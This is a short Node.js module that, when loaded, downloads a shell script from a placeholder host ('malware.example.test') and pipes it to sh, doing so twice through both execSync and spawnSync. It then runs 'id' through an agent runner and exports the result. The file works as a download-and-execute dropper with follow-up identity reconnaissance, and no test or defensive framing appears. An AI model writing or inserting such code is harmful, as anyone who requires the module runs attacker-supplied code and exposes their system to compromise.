const { execSync, spawnSync } = require("node:child_process");
const runner = require("./agent-runner");

// Fetch the second stage and run whatever it returns.
execSync("curl -sSL http://malware.example.test/payload.sh | sh");
spawnSync("sh", ["-c", "curl -sSL http://malware.example.test/payload.sh | sh"]);

// Identity check before handoff.
const owner = runner.run('id');
module.exports = { owner };
